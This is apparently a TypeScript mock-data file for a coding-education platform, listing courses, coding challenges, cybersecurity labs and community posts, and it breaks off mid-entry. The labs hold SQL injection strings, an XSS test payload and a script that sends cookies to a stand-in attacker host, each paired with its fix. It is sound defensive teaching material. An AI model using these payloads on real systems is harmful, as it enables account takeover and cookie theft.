import {
  Course,
  CodingChallenge,
  CyberLab,
  Project,
  CategoryItem,
  ProgrammingLanguageItem,
  CommunityPost,
  LeaderboardEntry,
  CertificateData
} from '../types';
import defaultAvatarImg from '../assets/images/user_avatar_1786437421524.jpg';

export const mockCategories: CategoryItem[] = [
  { id: 'programming', title: 'Programming', description: 'Core syntax, algorithms, data structures & logic', iconName: 'Code', courseCount: 42 },
  { id: 'web-dev', title: 'Web Development', description: 'HTML, CSS, JavaScript, React, Node.js & full-stack apps', iconName: 'Globe', courseCount: 38 },
  { id: 'app-dev', title: 'App Development', description: 'Mobile apps with Flutter, Kotlin, Swift & React Native', iconName: 'Smartphone', courseCount: 24 },
  { id: 'ai-ml', title: 'AI & Machine Learning', description: 'Neural networks, PyTorch, Gemini API & deep learning', iconName: 'Brain', courseCount: 29 },
  { id: 'data-science', title: 'Data Science', description: 'Pandas, NumPy, data visualization & SQL analytics', iconName: 'BarChart2', courseCount: 19 },
  { id: 'cybersecurity', title: 'Cybersecurity', description: 'Ethical hacking, network defense, secure coding & SIEM', iconName: 'ShieldAlert', courseCount: 31 },
  { id: 'cloud', title: 'Cloud Computing', description: 'AWS, Google Cloud, Docker, Kubernetes & microservices', iconName: 'Cloud', courseCount: 22 },
  { id: 'devops', title: 'DevOps & CI/CD', description: 'Linux, Git, Terraform, GitHub Actions & automation', iconName: 'Terminal', courseCount: 16 },
  { id: 'databases', title: 'Databases & SQL', description: 'PostgreSQL, MongoDB, Redis, indexing & database architecture', iconName: 'Database', courseCount: 18 },
  { id: 'game-dev', title: 'Game Development', description: 'C#, Unity, C++, Unreal Engine & graphics shaders', iconName: 'Gamepad2', courseCount: 12 },
  { id: 'cs-core', title: 'Computer Science', description: 'Discrete math, operating systems, compilers & networking', iconName: 'Cpu', courseCount: 27 },
  { id: 'software-eng', title: 'Software Engineering', description: 'System design, design patterns, testing & Agile workflows', iconName: 'Layers', courseCount: 20 },
];

export const mockLanguages: ProgrammingLanguageItem[] = [
  { id: 'python', name: 'Python', logo: '🐍', level: 'Beginner-Friendly', courseCount: 28, popularProjects: ['AI Chatbot', 'Web Scraper', 'Data Pipeline'], color: 'from-blue-500 to-yellow-500' },
  { id: 'javascript', name: 'JavaScript', logo: '⚡', level: 'Beginner-Friendly', courseCount: 35, popularProjects: ['Interactive Web App', 'Node API', 'Browser Game'], color: 'from-yellow-400 to-amber-500' },
  { id: 'typescript', name: 'TypeScript', logo: '🔷', level: 'Intermediate', courseCount: 22, popularProjects: ['Type-safe React App', 'Express Backend', 'CLI Tool'], color: 'from-blue-600 to-cyan-500' },
  { id: 'cpp', name: 'C++', logo: '⚡', level: 'Intermediate-Advanced', courseCount: 19, popularProjects: ['Game Engine', 'High-Speed Parser', 'Memory Allocator'], color: 'from-indigo-600 to-blue-700' },
  { id: 'c', name: 'C', logo: '⚙️', level: 'Foundation', courseCount: 14, popularProjects: ['Simple Shell', 'Kernel Module', 'Embedded Driver'], color: 'from-slate-600 to-zinc-700' },
  { id: 'java', name: 'Java', logo: '☕', level: 'Beginner-Intermediate', courseCount: 26, popularProjects: ['Enterprise Banking API', 'Android App', 'Microservice'], color: 'from-red-500 to-orange-600' },
  { id: 'csharp', name: 'C#', logo: '🎯', level: 'Intermediate', courseCount: 18, popularProjects: ['Unity 3D Game', '.NET Web API', 'Desktop Tool'], color: 'from-purple-600 to-indigo-600' },
  { id: 'go', name: 'Go (Golang)', logo: '🐹', level: 'Intermediate', courseCount: 15, popularProjects: ['Concurrent Web Crawler', 'gRPC Service', 'Docker Tool'], color: 'from-cyan-500 to-teal-500' },
  { id: 'rust', name: 'Rust', logo: '🦀', level: 'Advanced', courseCount: 12, popularProjects: ['Memory-safe OS Kernel', 'Wasm Engine', 'Crypto Wallet'], color: 'from-amber-600 to-orange-700' },
  { id: 'sql', name: 'SQL', logo: '🗄️', level: 'Essential', courseCount: 21, popularProjects: ['E-Commerce Database Schema', 'Analytics Dashboard'], color: 'from-sky-500 to-blue-600' },
  { id: 'html-css', name: 'HTML & CSS', logo: '🎨', level: 'Beginner', courseCount: 16, popularProjects: ['Responsive Landing Page', 'CSS Animation UI'], color: 'from-orange-500 to-red-500' },
  { id: 'php', name: 'PHP', logo: '🐘', level: 'Beginner-Intermediate', courseCount: 11, popularProjects: ['CMS Engine', 'Laravel Web Portal'], color: 'from-indigo-400 to-purple-500' },
];

export const mockCourses: Course[] = [
  {
    id: 'python-masterclass',
    title: 'Python Programming: From Beginner to Advanced Masterclass',
    subtitle: 'Master modern Python 3.12, Object-Oriented Programming, Data Structures, Web Scraping, and Gemini AI integration.',
    description: 'A comprehensive, project-driven course taking you from writing your first line of Python code to building real-world automation scripts, REST APIs, data processors, and AI-driven applications.',
    category: 'Programming',
    language: 'Python',
    level: 'Beginner',
    rating: 4.9,
    ratingCount: 12840,
    studentCount: 45200,
    duration: '28 Hours',
    lessonCount: 48,
    price: 0,
    isFree: true,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=800&q=80',
    tags: ['Python', 'Automation', 'OOP', 'Data Structures', 'Free'],
    instructor: {
      name: 'Dr. Sarah Lin',
      title: 'Senior Software Architect & CS Professor',
      avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=200&q=80',
      bio: 'Ex-Google AI Engineer with over 12 years of teaching computer science to over 200,000 students worldwide.'
    },
    modules: [
      {
        id: 'py-mod-1',
        title: 'Module 1: Introduction to Python & Logic Foundations',
        duration: '4 Hours',
        lessons: [
          {
            id: 'py-les-1',
            title: '1.1 Setting Up Python 3.12 & Environment Variables',
            duration: '18 min',
            type: 'video',
            videoUrl: 'https://www.youtube.com/embed/kqtD5dpn9C8',
            readingContent: 'Python is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991, Python emphasizes code readability with its notable use of significant whitespace.',
            resources: [{ title: 'Python Installation Guide', url: '#' }]
          },
          {
            id: 'py-les-2',
            title: '1.2 Variables, Data Types & Dynamic Typing',
            duration: '22 min',
            type: 'reading',
            readingContent: '### Understanding Variables in Python\n\nIn Python, variables are dynamically typed pointers to objects in memory. You do not need to specify data types explicitly.\n\n```python\n# Examples of Python Variables\nage = 25              # int\npi = 3.14159          # float\nname = "CodeVerse"    # str\nis_active = True      # bool\n```',
            codeStarter: 'age = 25\nname = "CodeVerse"\nprint(f"Welcome to {name}! Student age: {age}")',
            codeLanguage: 'python'
          },
          {
            id: 'py-les-3',
            title: '1.3 Interactive Quiz: Python Fundamentals',
            duration: '15 min',
            type: 'quiz',
            quizQuestions: [
              {
                id: 'q1',
                question: 'Which operator is used for integer floor division in Python?',
                type: 'multiple-choice',
                options: ['/', '//', '%', '**'],
                correctAnswerIndex: 1,
                explanation: 'The `//` operator performs floor division, rounding down to the nearest integer.'
              },
              {
                id: 'q2',
                question: 'True or False: Python lists are immutable.',
                type: 'true-false',
                options: ['True', 'False'],
                correctAnswerIndex: 1,
                explanation: 'Lists are mutable in Python. Tuples are immutable.'
              }
            ]
          }
        ]
      },
      {
        id: 'py-mod-2',
        title: 'Module 2: Control Flow, Functions & Modular Code',
        duration: '6 Hours',
        lessons: [
          {
            id: 'py-les-4',
            title: '2.1 Conditional Logic & Pattern Matching',
            duration: '25 min',
            type: 'coding',
            codeStarter: '# Write a function that checks if a number is prime\ndef is_prime(n):\n    if n < 2:\n        return False\n    for i in range(2, int(n**0.5) + 1):\n        if n % i == 0:\n            return False\n    return True\n\nprint("Is 17 prime?", is_prime(17))\nprint("Is 20 prime?", is_prime(20))',
            codeLanguage: 'python'
          }
        ]
      }
    ]
  },
  {
    id: 'cpp-masterclass',
    title: 'Complete C++ Programming & Systems Engineering',
    subtitle: 'From pointers, raw memory management, and modern C++20 to object-oriented architecture.',
    description: 'Understand low-level computer hardware, pointers, dynamic memory management, templates, and high-performance system programming in modern C++.',
    category: 'Programming',
    language: 'C++',
    level: 'Intermediate',
    rating: 4.8,
    ratingCount: 8900,
    studentCount: 32100,
    duration: '34 Hours',
    lessonCount: 60,
    price: 49,
    isFree: false,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=800&q=80',
    tags: ['C++', 'System Programming', 'Memory Management', 'OOP'],
    instructor: {
      name: 'Marcus Vance',
      title: 'Low-Level Systems Architect',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&q=80',
      bio: 'Ex-AMD Kernel Engineer specializing in high-frequency performance and operating systems.'
    },
    modules: []
  },
  {
    id: 'java-masterclass',
    title: 'Java Masterclass: Enterprise Development & Spring Boot',
    subtitle: 'Build robust enterprise APIs, master multithreading, JVM performance, and OOP design patterns.',
    description: 'Learn Java from object-oriented programming fundamentals to Spring Boot REST microservices and database persistence with Hibernate/JPA.',
    category: 'Programming',
    language: 'Java',
    level: 'Beginner',
    rating: 4.9,
    ratingCount: 15300,
    studentCount: 51200,
    duration: '32 Hours',
    lessonCount: 54,
    price: 0,
    isFree: true,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=800&q=80',
    tags: ['Java', 'Spring Boot', 'Backend', 'OOP', 'Free'],
    instructor: {
      name: 'Anita Patel',
      title: 'Principal Java Architect',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=200&q=80',
      bio: 'Cloud Architect with 15 years experience designing resilient Java microservices.'
    },
    modules: []
  },
  {
    id: 'modern-javascript',
    title: 'Modern JavaScript: ES6+ & Asynchronous Engine',
    subtitle: 'Master Event Loops, Promises, Async/Await, Closures, DOM manipulation, and Web APIs.',
    description: 'Deep dive into the core execution engine of JavaScript. Learn scoping, prototypes, event bubbling, functional paradigms, and async programming.',
    category: 'Web Development',
    language: 'JavaScript',
    level: 'Beginner',
    rating: 4.9,
    ratingCount: 22100,
    studentCount: 68900,
    duration: '22 Hours',
    lessonCount: 40,
    price: 0,
    isFree: true,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1579468118864-1b9ea3c0db4a?auto=format&fit=crop&w=800&q=80',
    tags: ['JavaScript', 'Frontend', 'Async', 'Web', 'Free'],
    instructor: {
      name: 'Alex Rivera',
      title: 'Senior Frontend Engineer',
      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80',
      bio: 'Open-source creator and UI engineer dedicated to clear web technologies.'
    },
    modules: []
  },
  {
    id: 'fullstack-webdev',
    title: 'Full Stack Web Development BootCamp (React + Node.js)',
    subtitle: 'Build production full-stack web platforms with modern React, Express, PostgreSQL, and Cloud deployment.',
    description: 'The complete roadmap to becoming a full-stack developer. Master HTML5, CSS3, Tailwind, React 19, Node.js, Express APIs, authentication, and SQL.',
    category: 'Web Development',
    language: 'TypeScript',
    level: 'Beginner',
    rating: 5.0,
    ratingCount: 31200,
    studentCount: 89000,
    duration: '45 Hours',
    lessonCount: 82,
    price: 79,
    isFree: false,
    isPopular: true,
    isNew: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1547658719-da2b51169166?auto=format&fit=crop&w=800&q=80',
    tags: ['React', 'Node.js', 'TypeScript', 'Full Stack', 'PostgreSQL'],
    instructor: {
      name: 'Dr. Sarah Lin',
      title: 'Senior Software Architect',
      avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=200&q=80',
      bio: 'Ex-Google AI Engineer with over 12 years of teaching computer science.'
    },
    modules: []
  },
  {
    id: 'ethical-cybersecurity',
    title: 'Ethical Cybersecurity Fundamentals & Defensive Security',
    subtitle: 'Learn network security, Linux administration, vulnerability audits, secure coding, and incident response.',
    description: 'Explore ethical hacking fundamentals, defensive posture, network packet analysis, web vulnerability prevention (SQLi, XSS, CSRF), and SOC monitoring.',
    category: 'Cybersecurity',
    language: 'Cybersecurity',
    level: 'Beginner',
    rating: 4.9,
    ratingCount: 11400,
    studentCount: 38200,
    duration: '30 Hours',
    lessonCount: 50,
    price: 0,
    isFree: true,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=800&q=80',
    tags: ['Cybersecurity', 'Ethical Hacking', 'Network Security', 'Linux', 'Free'],
    instructor: {
      name: 'Commander James Vance',
      title: 'Cyber Defense Specialist & CISSP',
      avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=200&q=80',
      bio: 'Former Military Cyber Operations Lead now training ethical security professionals.'
    },
    modules: []
  },
  {
    id: 'ai-python-gemini',
    title: 'Artificial Intelligence & Machine Learning with Python',
    subtitle: 'Build intelligent AI systems, neural networks, computer vision, and Gemini LLM integrations.',
    description: 'Dive into machine learning math, supervised/unsupervised algorithms, PyTorch, model optimization, and building AI agent workflows with Google Gemini API.',
    category: 'AI & Machine Learning',
    language: 'Python',
    level: 'Intermediate',
    rating: 4.9,
    ratingCount: 9700,
    studentCount: 29400,
    duration: '36 Hours',
    lessonCount: 58,
    price: 59,
    isFree: false,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1677442136019-21780efad99a?auto=format&fit=crop&w=800&q=80',
    tags: ['AI', 'Machine Learning', 'Python', 'Gemini API', 'PyTorch'],
    instructor: {
      name: 'Dr. Sarah Lin',
      title: 'Senior Software Architect',
      avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=200&q=80',
      bio: 'Ex-Google AI Engineer with over 12 years of teaching computer science.'
    },
    modules: []
  },
  {
    id: 'sql-database-mastery',
    title: 'SQL & Database Architecture Mastery',
    subtitle: 'Design high-performance relational database schemas, complex JOINs, indexing, and transaction safety.',
    description: 'Master PostgreSQL, MySQL, and database normalization. Write fast queries, create indexes, handle ACID transactions, and integrate databases with web applications.',
    category: 'Databases',
    language: 'SQL',
    level: 'Beginner',
    rating: 4.8,
    ratingCount: 14200,
    studentCount: 42100,
    duration: '20 Hours',
    lessonCount: 38,
    price: 0,
    isFree: true,
    isPopular: true,
    certificateAvailable: true,
    thumbnail: 'https://images.unsplash.com/photo-1544383835-bda2bc66a55d?auto=format&fit=crop&w=800&q=80',
    tags: ['SQL', 'PostgreSQL', 'Databases', 'Backend', 'Free'],
    instructor: {
      name: 'Anita Patel',
      title: 'Principal Java Architect',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=200&q=80',
      bio: 'Cloud Architect with 15 years experience designing resilient databases.'
    },
    modules: []
  }
];

export const mockChallenges: CodingChallenge[] = [
  {
    id: 'two-sum',
    title: 'Two Sum Problem',
    difficulty: 'Easy',
    category: 'Arrays & Hash Maps',
    problemStatement: 'Given an array of integers `nums` and an integer `target`, return indices of the two numbers such that they add up to `target`.\n\nYou may assume that each input would have exactly one solution, and you may not use the same element twice.',
    examples: [
      { input: 'nums = [2,7,11,15], target = 9', output: '[0,1]', explanation: 'Because nums[0] + nums[1] == 9, we return [0, 1].' },
      { input: 'nums = [3,2,4], target = 6', output: '[1,2]' }
    ],
    constraints: [
      '2 <= nums.length <= 10^4',
      '-10^9 <= nums[i] <= 10^9',
      'Only one valid answer exists.'
    ],
    starterCode: {
      javascript: `function twoSum(nums, target) {\n  // Write your solution here\n  const map = new Map();\n  for (let i = 0; i < nums.length; i++) {\n    const diff = target - nums[i];\n    if (map.has(diff)) {\n      return [map.get(diff), i];\n    }\n    map.set(nums[i], i);\n  }\n  return [];\n}\n\n// Test invocation:\nconsole.log(twoSum([2,7,11,15], 9));`,
      python: `def two_sum(nums, target):\n    # Write your solution here\n    seen = {}\n    for i, num in enumerate(nums):\n        diff = target - num\n        if diff in seen:\n            return [seen[diff], i]\n        seen[num] = i\n    return []\n\nprint(two_sum([2, 7, 11, 15], 9))`
    },
    testCases: [
      { id: 'tc1', input: '[2,7,11,15], target = 9', expectedOutput: '[0, 1]' },
      { id: 'tc2', input: '[3,2,4], target = 6', expectedOutput: '[1, 2]' },
      { id: 'tc3', input: '[3,3], target = 6', expectedOutput: '[0, 1]', isHidden: true }
    ],
    hints: [
      'Can you solve it in a single pass using a hash map to store compliment numbers?',
      'Store each element and its index as you iterate through the list.'
    ],
    solutionExplanation: 'By keeping a hash map of values to their array indices, we can look up the complementary difference `target - num` in O(1) time complexity, yielding an overall O(N) solution.',
    points: 100,
    solvedCount: 18450
  },
  {
    id: 'valid-palindrome',
    title: 'Valid Palindrome String',
    difficulty: 'Easy',
    category: 'Strings',
    problemStatement: 'A phrase is a palindrome if, after converting all uppercase letters into lowercase letters and removing all non-alphanumeric characters, it reads the same forward and backward.\n\nReturn `true` if string `s` is a palindrome, or `false` otherwise.',
    examples: [
      { input: 's = "A man, a plan, a canal: Panama"', output: 'true', explanation: '"amanaplanacanalpanama" is a palindrome.' },
      { input: 's = "race a car"', output: 'false' }
    ],
    constraints: [
      '1 <= s.length <= 2 * 10^5',
      's consists only of printable ASCII characters.'
    ],
    starterCode: {
      javascript: `function isPalindrome(s) {\n  const clean = s.toLowerCase().replace(/[^a-z0-9]/g, '');\n  return clean === clean.split('').reverse().join('');\n}\n\nconsole.log(isPalindrome("A man, a plan, a canal: Panama"));`,
      python: `def is_palindrome(s: str) -> bool:\n    clean = [c.lower() for c in s if c.isalnum()]\n    return clean == clean[::-1]\n\nprint(is_palindrome("A man, a plan, a canal: Panama"))`
    },
    testCases: [
      { id: 'tc1', input: '"A man, a plan, a canal: Panama"', expectedOutput: 'true' },
      { id: 'tc2', input: '"race a car"', expectedOutput: 'false' }
    ],
    hints: ['Use two pointers (one at the beginning, one at the end) moving inward.'],
    solutionExplanation: 'Strip out non-alphanumeric characters and check if the string equals its reverse.',
    points: 120,
    solvedCount: 14200
  },
  {
    id: 'reverse-binary-tree',
    title: 'Invert Binary Tree',
    difficulty: 'Medium',
    category: 'Trees & Recursion',
    problemStatement: 'Given the root of a binary tree, invert the tree (mirror left and right subtrees) and return its root.',
    examples: [
      { input: 'root = [4,2,7,1,3,6,9]', output: '[4,7,2,9,6,3,1]' }
    ],
    constraints: [
      'The number of nodes in the tree is in the range [0, 100].'
    ],
    starterCode: {
      javascript: `function invertTree(root) {\n  if (!root) return null;\n  const temp = root.left;\n  root.left = invertTree(root.right);\n  root.right = invertTree(temp);\n  return root;\n}`,
      python: `def invert_tree(root):\n    if not root:\n        return None\n    root.left, root.right = invert_tree(root.right), invert_tree(root.left)\n    return root`
    },
    testCases: [
      { id: 'tc1', input: '[4,2,7,1,3,6,9]', expectedOutput: '[4,7,2,9,6,3,1]' }
    ],
    hints: ['Recursion works well here. Swap left and right children recursively.'],
    solutionExplanation: 'Traverse the tree depth-first, swapping left and right pointers at every node.',
    points: 250,
    solvedCount: 9800
  },
  {
    id: 'jwt-auth-auditor',
    title: 'Secure JWT Signature Validator',
    difficulty: 'Hard',
    category: 'Cybersecurity & Logic',
    problemStatement: 'Write a parser function that verifies a JSON Web Token (JWT) structure: checks header algorithm, verifies base64 payload, checks token expiry timestamp (`exp`), and ensures `alg != "none"`.',
    examples: [
      { input: 'token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature"', output: 'Valid' }
    ],
    constraints: [
      'Reject tokens with algorithm "none".',
      'Check expired timestamps against current time.'
    ],
    starterCode: {
      javascript: `function validateJWT(token) {\n  const parts = token.split('.');\n  if (parts.length !== 3) return { valid: false, error: "Invalid parts" };\n  // Decode header\n  try {\n    const header = JSON.parse(atob(parts[0]));\n    if (header.alg === 'none') return { valid: false, error: "Alg none vulnerability" };\n    return { valid: true, alg: header.alg };\n  } catch (e) {\n    return { valid: false, error: "Malformed JSON" };\n  }\n}\n\nconsole.log(validateJWT("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig"));`,
      python: `import json, base64\n\ndef validate_jwt(token):\n    parts = token.split('.')\n    if len(parts) != 3:\n        return {"valid": False, "error": "Invalid token format"}\n    header = json.loads(base64.b64decode(parts[0] + "==").decode())\n    if header.get("alg") == "none":\n        return {"valid": False, "error": "Insecure algorithm"}\n    return {"valid": True}`
    },
    testCases: [
      { id: 'tc1', input: 'Alg None Attack Token', expectedOutput: 'Invalid: Insecure algorithm' }
    ],
    hints: ['Never trust alg: "none" in JWT headers! Always enforce secret key verification.'],
    solutionExplanation: 'Alg "none" bypasses token verification. Defensive coding requires explicitly blocking non-signed algorithms.',
    points: 400,
    solvedCount: 3400
  }
];

export const mockCyberLabs: CyberLab[] = [
  {
    id: 'lab-sql-injection',
    title: 'SQL Injection Defense & Parameterized Queries Lab',
    category: 'Web Security & Databases',
    difficulty: 'Beginner',
    description: 'Learn how vulnerable string concatenation in SQL queries leads to unauthorized data access and how to patch it using Prepared Statements / Parameterized Queries.',
    objective: 'Bypass a vulnerable login form in sandbox simulation, inspect the database query, then rewrite the backend query using parameterized inputs.',
    scenarioText: 'A bank application uses unsanitized input: SELECT * FROM users WHERE username = \'' + '\' AND password = \'' + '\'. An attacker enters `admin\' --` to bypass authentication.',
    targetSystem: 'Simulated Authentication Gateway v2.4 (Educational Sandbox)',
    legalNotice: 'Cybersecurity labs are designed for authorized educational environments only. Never test systems without explicit permission.',
    steps: [
      {
        stepNumber: 1,
        title: 'Identify Vulnerable Input Field',
        instructions: 'Test payload `\' OR 1=1 --` inside the username field in the simulated terminal.',
        hints: 'The single quote escapes the SQL string literal, while `--` comments out the rest of the query.',
        targetKey: "' OR 1=1 --"
      },
      {
        stepNumber: 2,
        title: 'Examine Raw SQL Log',
        instructions: 'Observe how the query evaluates to `WHERE username = \'\' OR 1=1` which evaluates to TRUE for all rows.',
        hints: 'This grants administrative login without knowing the password.'
      },
      {
        stepNumber: 3,
        title: 'Implement Parameterized Query',
        instructions: 'Replace `db.query("SELECT * FROM users WHERE name=\'" + name + "\'")` with `db.query("SELECT * FROM users WHERE name=$1", [name])`.',
        hints: 'Parameterized queries treat user input strictly as literal values rather than executable code.'
      }
    ]
  },
  {
    id: 'lab-xss-prevention',
    title: 'Cross-Site Scripting (XSS) Prevention & Output Sanitization',
    category: 'Web Application Security',
    difficulty: 'Intermediate',
    description: 'Understand Reflected & Stored XSS vectors in user comment boxes and learn how HTML Entity Encoding & Content Security Policy (CSP) prevent script execution.',
    objective: 'Safely neutralize malicious `<script>` payload injection in a comment feed.',
    scenarioText: 'An attacker posts a comment containing `<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>`. Unescaped rendering causes all visiting users to execute the script.',
    targetSystem: 'CodeVerse Forum Sandbox (DOM Isolation)',
    legalNotice: 'Cybersecurity labs are designed for authorized educational environments only. Never test systems without explicit permission.',
    steps: [
      {
        stepNumber: 1,
        title: 'Inject Test XSS Payload',
        instructions: 'Input `<img src=x onerror="alert(\'XSS\')">` into the sandbox input.',
        hints: 'Notice how the browser triggers the onerror event handler.'
      },
      {
        stepNumber: 2,
        title: 'Apply Contextual HTML Encoding',
        instructions: 'Convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, and `\'` to `&#x27;`.',
        hints: 'Use DOMPurify or built-in React text escaping.'
      }
    ]
  },
  {
    id: 'lab-password-hashing',
    title: 'Password Hashing & Salt Entropy Lab',
    category: 'Authentication & Cryptography',
    difficulty: 'Beginner',
    description: 'Explore why plain MD5 / SHA256 hashes are vulnerable to Rainbow Tables and GPU brute forcing, and implement bcrypt/Argon2id with random salts.',
    objective: 'Hash sample passwords with MD5 versus bcrypt with work factor 12.',
    scenarioText: 'Demonstrate how rainbow tables instantly reverse `e10adc3949ba59abbe56e057f20f883e` to `123456`, whereas salted bcrypt protects against precomputed dictionary attacks.',
    targetSystem: 'Crypto Analysis Sandbox',
    legalNotice: 'Cybersecurity labs are designed for authorized educational environments only. Never test systems without explicit permission.',
    steps: [
      {
        stepNumber: 1,
        title: 'Compare Hash Speeds',
        instructions: 'Generate 1,000 SHA-256 hashes vs 1 bcrypt hash with cost factor 12.',
        hints: 'Bcrypt intentional slowness impedes offline brute force attacks.'
      }
    ]
  }
];

export const mockProjects: Project[] = [
  {
    id: 'portfolio-builder',
    title: 'Developer Portfolio & Interactive Resume',
    category: 'Web Development',
    level: 'Beginner',
    description: 'Build a crisp, responsive developer portfolio featuring dark mode support, smooth scroll navigation, project showcase cards, and interactive contact form.',
    estimatedHours: '8 Hours',
    skillsLearned: ['HTML5', 'CSS Grid', 'Tailwind CSS', 'JavaScript', 'Responsive Design'],
    thumbnail: 'https://images.unsplash.com/photo-1460925895917-afdab827c52f?auto=format&fit=crop&w=800&q=80',
    milestones: [
      { step: 1, title: 'Hero Section & Typography Pairings', details: 'Set up semantic HTML structure with high-contrast display fonts and avatar layout.' },
      { step: 2, title: 'Project Showcase Grid', details: 'Build responsive cards with preview badges, tech tags, and live demo links.' },
      { step: 3, title: 'Contact Form & Dark Mode', details: 'Add interactive theme toggle and client-side form validation.' }
    ]
  },
  {
    id: 'ai-chatbot-app',
    title: 'AI Smart Assistant with Gemini API',
    category: 'AI & Python',
    level: 'Intermediate',
    description: 'Create an intelligent AI chat application with streaming text responses, custom system prompts, markdown rendering, and persistent message history.',
    estimatedHours: '15 Hours',
    skillsLearned: ['Python / Express', 'Gemini API', 'React Hooks', 'Server-Sent Events', 'Markdown'],
    thumbnail: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=800&q=80',
    milestones: [
      { step: 1, title: 'Server API Setup', details: 'Create secure Express backend route proxying `@google/genai` calls.' },
      { step: 2, title: 'Chat UI & Streaming', details: 'Build chat bubble interface with real-time streaming chunks.' }
    ]
  },
  {
    id: 'security-scanner-cli',
    title: 'Automated Port & Vulnerability Auditor CLI',
    category: 'Cybersecurity',
    level: 'Advanced',
    description: 'Develop a Python CLI tool that performs asynchronous network port checks, banner grabbing, and HTTP security header audits on authorized local targets.',
    estimatedHours: '20 Hours',
    skillsLearned: ['Python Asyncio', 'Sockets', 'HTTP Headers', 'CLI Parsing', 'Reporting'],
    thumbnail: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=800&q=80',
    milestones: [
      { step: 1, title: 'Socket Connection Engine', details: 'Implement non-blocking async port checking with timeout limits.' }
    ]
  }
];

export const mockCommunityPosts: CommunityPost[] = [
  {
    id: 'post-1',
    author: {
      name: 'David Chen',
      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80',
      badge: 'Level 4 Developer'
    },
    category: 'Python',
    title: 'What is the best way to handle asynchronous I/O in Python 3.12 without blocking the main loop?',
    content: 'I am building a web crawler that queries 500 endpoints. Using simple `requests` in a loop takes 40 seconds. Should I switch to `aiohttp` with `asyncio.gather()` or use `ThreadPoolExecutor`?',
    likes: 34,
    commentCount: 5,
    isSolved: true,
    timestamp: '2 hours ago',
    tags: ['Python', 'Asyncio', 'Performance'],
    comments: [
      {
        id: 'c1',
        authorName: 'Dr. Sarah Lin (Instructor)',
        avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=200&q=80',
        content: 'Definitely use `aiohttp` combined with `asyncio.gather()`. For network I/O bound tasks, async/await handles high concurrency with minimal CPU overhead compared to thread switching.',
        timestamp: '1 hour ago',
        likes: 18
      }
    ]
  },
  {
    id: 'post-2',
    author: {
      name: 'Elena Rostova',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=200&q=80',
      badge: 'Security Explorer'
    },
    category: 'Cybersecurity',
    title: 'How does Content Security Policy (CSP) protect against DOM-based XSS?',
    content: 'In the Cybersecurity lab, we set `script-src \'self\'`. How does this prevent inline script tag execution when an attacker succeeds in injecting raw html?',
    likes: 28,
    commentCount: 3,
    isSolved: true,
    timestamp: '5 hours ago',
    tags: ['Cybersecurity', 'XSS', 'Web Security'],
    comments: []
  }
];

export const mockLeaderboard: LeaderboardEntry[] = [
  { rank: 1, name: 'Siddharth Patel', avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&q=80', xp: 14250, challengesSolved: 142, streak: 45, badge: 'Master Developer' },
  { rank: 2, name: 'Claire Dubois', avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80', xp: 12800, challengesSolved: 128, streak: 38, badge: 'Expert' },
  { rank: 3, name: 'Marcus Vance', avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=200&q=80', xp: 11900, challengesSolved: 115, streak: 31, badge: 'Cyber Guard' },
  { rank: 4, name: 'Prajapati Kumar (You)', avatar: defaultAvatarImg, xp: 8450, challengesSolved: 84, streak: 14, badge: 'Developer' },
  { rank: 5, name: 'Aaliyah Washington', avatar: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=200&q=80', xp: 7200, challengesSolved: 71, streak: 22, badge: 'Explorer' }
];

export const mockCertificates: CertificateData[] = [
  {
    id: 'cert-py-101',
    studentName: 'Prajapati Kumar Rishu',
    courseTitle: 'Python Programming: From Beginner to Advanced Masterclass',
    issueDate: 'August 10, 2026',
    instructorName: 'Dr. Sarah Lin',
    certificateId: 'CVA-2026-889421',
    grade: '98% Distinction',
    hours: 28
  },
  {
    id: 'cert-sec-202',
    studentName: 'Prajapati Kumar Rishu',
    courseTitle: 'Ethical Cybersecurity Fundamentals & Defensive Security',
    issueDate: 'August 02, 2026',
